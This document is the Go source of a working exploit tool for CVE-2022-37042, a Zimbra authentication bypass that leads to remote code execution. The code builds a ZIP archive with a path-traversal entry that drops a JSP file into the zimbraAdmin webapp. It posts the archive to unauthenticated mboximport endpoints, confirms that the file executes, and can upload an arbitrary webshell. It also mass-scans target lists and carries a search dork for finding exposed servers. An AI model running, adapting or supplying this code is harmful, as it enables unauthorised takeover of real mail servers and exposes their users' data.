package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/levels"
)

const (
	HttpProxy  = "http://127.0.0.1:8080"
	SocksProxy = "socks5://127.0.0.1:7890"
)

var finalresult []string

var banner = fmt.Sprintf(`
_______    ________    ___   ____ ___  ___       ______________  __ __ ___ 
/ ____/ |  / / ____/   |__ \ / __ \__ \|__ \     |__  /__  / __ \/ // /|__ \
/ /    | | / / __/________/ // / / /_/ /__/ /_____ /_ <  / / / / / // /___/ /
/ /___  | |/ / /__/_____/ __// /_/ / __// __/_____/__/ / / / /_/ /__  __/ __/ 
\____/  |___/_____/    /____/\____/____/____/    /____/ /_/\____/  /_/ /____/ 

							%s										
`, "@_0xf4n9x_")

type VulnInfo struct {
	Name         string
	VulID        []string
	Version      string
	Author       string
	VulDate      string
	References   []string
	AppName      string
	AppPowerLink string
	AppVersion   string
	VulType      string
	Description  string
	Category     string
	Dork         QueryDork
}

type QueryDork struct {
	Fofa    string
	Quake   string
	Zoomeye string
	Shodan  string
}

// Options contains the configuration options
type Options struct {
	Verbose     bool   // Verbose flag indicates whether to show verbose output or not
	ShowInfo    bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Exploit     bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Stdin       bool   // Stdin specifies whether stdin input was given to the process
	Timeout     int    // Timeout is the seconds to wait for sources to respond
	Target      string // Target to verfity CVE-2022-37042
	TargetsFile string // TargetsFile containing list of targets to verfity
	UploadFile  string // The webshell to be uploaded
	Threads     int    // Thread controls the number of threads to use for active enumerations
	Output      io.Writer
	OutputFile  string // Output is the file to write found subdomains to.
}

func showBanner() {
	gologger.Print().Msgf("%s\n", banner)
	gologger.Print().Label("WRN").Msgf("Use with caution. You are responsible for your actions.\n")
	gologger.Print().Label("WRN").Msgf("Developers assume no liability and are not responsible for any misuse or damage.\n\n")
}

func showInfo() {
	info := VulnInfo{
		Name:    "CVE-2022-37042 Zimbra Auth Bypass leads to RCE",
		VulID:   []string{"CVE-2022-37042"},
		Version: "1.0",
		Author:  "0xf9",
		VulDate: "2022-10-07",
		References: []string{"https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/",
			"https://nvd.nist.gov/vuln/detail/CVE-2022-37042"},
		AppName:      "Zimbra",
		AppPowerLink: "https://www.zimbra.com/",
		AppVersion:   "Zimbra Collaboration Suite 8.8.15 and 9.0",
		VulType:      "RCE",
		Description:  "Zimbra Collaboration Suite (ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. By bypassing authentication (i.e., not having an authtoken), an attacker can upload arbitrary files to the system, leading to directory traversal and remote code execution. NOTE: this issue exists because of an incomplete fix for CVE-2022-27925.",
		Category:     "REMOTE",
		Dork:         QueryDork{Fofa: `app="zimbra-邮件系统" && (protocol="http" || protocol="https")`},
	}
	vulnJson, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(vulnJson))
}

// parseOptions parses the command line flags provided by a user
func parseOptions() *Options {
	options := &Options{}

	flag.BoolVar(&options.Verbose, "v", true, "Show Verbose output")
	flag.BoolVar(&options.ShowInfo, "s", false, "Show VulnInfo output")
	flag.IntVar(&options.Threads, "t", 10, "Number of threads to use (default 10)")
	flag.StringVar(&options.Target, "u", "", "Target URL to scan")
	flag.StringVar(&options.TargetsFile, "l", "", "Path to file containing a list of target URLs to scan (one per line)")
	flag.StringVar(&options.UploadFile, "uf", "", "The webshell to be uploaded")
	flag.StringVar(&options.OutputFile, "o", "", "Output file to write found issues/vulnerabilities")
	flag.Parse()

	options.Output = os.Stdout
	options.Stdin = hasStdin()

	if options.ShowInfo {
		gologger.Info().Msg("VulnInfo:\n")
		showInfo()
		os.Exit(0)
	} else if len(os.Args) <= 1 && !options.Stdin {
		gologger.Info().Msg("Use the -h flag to see the usage help.")
		os.Exit(0)
	}

	if options.Verbose {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelVerbose)
	} else {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelSilent)
	}

	err := options.validateOptions()
	if err != nil {
		gologger.Fatal().Msgf("Program exiting: %s\n", err)
	}
	return options
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0
	return isPipedFromChrDev || isPipedFromFIFO
}

func (options *Options) validateOptions() error {
	if options.Target == "" && options.TargetsFile == "" && !options.Stdin {
		return errors.New("no input list provided")
	}
	if options.Threads == 0 {
		return errors.New("threads cannot be zero")
	}
	return nil
}

func targetParser(target string) []string {
	if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") {
		u, _ := url.Parse(target)
		res := []string{u.Scheme + "://" + u.Host}
		return res
	}
	return nil
}

func createFile(filename string, appendtoFile bool) (*os.File, error) {
	if filename == "" {
		return nil, errors.New("empty filename")
	}
	dir := filepath.Dir(filename)
	if dir != "" {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			err := os.MkdirAll(dir, os.ModePerm)
			if err != nil {
				return nil, err
			}
		}
	}
	var file *os.File
	var err error
	if appendtoFile {
		file, err = os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	} else {
		file, err = os.Create(filename)
	}
	if err != nil {
		return nil, err
	}
	return file, nil
}

func writePlainResult(results []string, writer io.Writer) error {
	bufwriter := bufio.NewWriter(writer)
	sb := &strings.Builder{}

	for _, result := range results {
		sb.WriteString(result)
		sb.WriteString("\n")

		_, err := bufwriter.WriteString(sb.String())
		if err != nil {
			bufwriter.Flush()
			return err
		}
		sb.Reset()
	}
	return bufwriter.Flush()
}

func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func genEvilZip(file string) (string, string, []byte) {
	filename := genRandStr(12) + ".jsp"

	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	defer writer.Close()
	evilpath := "../../../../mailboxd/webapps/zimbraAdmin/" + filename
	f, _ := writer.Create(evilpath)

	keyStrings1 := genRandStr(8)
	keyStrings2 := genRandStr(8)
	keyStrings := keyStrings1 + keyStrings2
	var content []byte = []byte("<%\nout.println(\"" + keyStrings1 + "\" + \"" + keyStrings2 + "\");\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\n%>")

	if file != "null" {
		content, _ = ioutil.ReadFile(filepath.Clean(file))
	}

	f.Write(content)
	f, _ = writer.Create(evilpath)
	f.Write(content)
	_ = writer.Close()

	// filename = strings.TrimSuffix(filename, path.Ext(filename)) + ".zip"
	// ioutil.WriteFile(filename, buf.Bytes(), 0777)

	return filename, keyStrings, buf.Bytes()
}

func verifyControl(target interface{}) {
	t := target.(string)
	verify(t)
}

func verify(target string) string {
	t := target
	paths := []string{"/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1",
		"/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd"}

	filename, keyStrings, zipContent := genEvilZip("null")

	client := resty.New()
	client.SetProxy(HttpProxy)
	client.SetTimeout(15 * time.Second)

	for _, path := range paths {
		url := t + path
		resp, err := client.R().
			SetHeader("Accept-Encoding", "gzip, deflate").
			SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/600.2.17 (KHTML, like Gecko) Version/12.0 Safari/594.2").
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			SetBody(zipContent).
			Post(url)

		if err != nil {
			gologger.Warning().Msg("Request error: " + t)
			return "no path"
		}

		if resp.StatusCode() == 401 {
			url := t + "/zimbraAdmin/" + filename

			client := resty.New()
			client.SetProxy(HttpProxy)
			client.SetTimeout(15 * time.Second)
			resp, _ := client.R().EnableTrace().Get(url)

			if strings.Contains(string(resp.Body()), keyStrings) {
				gologger.Print().Label("VULN").Msg(t + " is vulnerable :)")
				finalresult = append(finalresult, t)
				return path
			} else {
				continue
			}
		} else {
			continue
		}
	}

	gologger.Info().Msg(t + " is not vulnerable :(")
	return "no path"
}

func exploit(target string, file string, path string) bool {
	url := target + path

	filename, _, zipContent := genEvilZip(file)

	client := resty.New()
	client.SetProxy(HttpProxy)
	client.SetTimeout(15 * time.Second)

	resp, err := client.R().
		SetHeader("Accept-Encoding", "gzip, deflate").
		SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/600.2.17 (KHTML, like Gecko) Version/12.0 Safari/594.2").
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBody(zipContent).
		Post(url)

	if err != nil {
		gologger.Warning().Msg("Request error: " + target)
		return false
	}

	if resp.StatusCode() == 401 {
		url := target + "/zimbraAdmin/" + filename
		gologger.Info().Msg("Uploaded Successfully! Webshell: " + url)
		finalresult = append(finalresult, target)
		return true
	}

	return false
}

func runner(options *Options) error {
	targets := []string{}
	outputs := []io.Writer{options.Output}

	if options.OutputFile != "" {
		file, err := createFile(options.OutputFile, false)
		if err != nil {
			gologger.Error().Msgf("Could not create file %s for %s: %s\n", options.OutputFile, options.Target, err)
			return err
		}
		defer file.Close()
		outputs = append(outputs, file)
	}

	if options.Target != "" {
		// If output file specified, create file
		targets = targetParser(options.Target)
	} else if options.TargetsFile != "" {
		reader, err := os.Open(options.TargetsFile)
		if err != nil {
			return err
		}
		scanner := bufio.NewScanner(reader)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
		reader.Close()
		return err
	} else if options.Stdin {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
	}

	if len(targets) == 1 && options.UploadFile != "" {
		gologger.Info().Msg("Target: " + targets[0])
		gologger.Info().Msg("The evil zip file is be generating...")

		uploadfile := options.UploadFile

		path := verify(targets[0])
		if path != "no path" {
			gologger.Info().Msg("Attempt to uploading " + uploadfile)
			exploit(targets[0], uploadfile, path)
		}
		return nil
	} else if len(targets) == 1 {
		gologger.Info().Msg("Target: " + targets[0])
		gologger.Info().Msg("The evil zip file is be generating...")
		gologger.Info().Msg("Try to upload this malicious zip file...")

		path := verify(targets[0])

		if path != "no path" {
			gologger.Info().Msg("Path: " + path)
		}

		return nil
	} else {
		wg := sync.WaitGroup{}

		var execFunc func(i interface{})
		if true {
			execFunc = verifyControl
		}

		p, _ := ants.NewPoolWithFunc(options.Threads, func(i interface{}) {
			execFunc(i)
			wg.Done()
		})
		defer p.Release()
		for _, t := range targets {
			//gologger.Info().Msg(t)
			wg.Add(1)
			_ = p.Invoke(t)
		}
		wg.Wait()
	}

	var err error
	for _, w := range outputs {
		err = writePlainResult(finalresult, w)
		if err != nil {
			gologger.Error().Msgf("Could not verbose results, Error: %s\n", err)
			return err
		}
	}
	return nil
}

func main() {
	showBanner()

	options := parseOptions()

	err := runner(options)
	if err != nil {
		gologger.Error().Msg("Runner Error")
	}
}
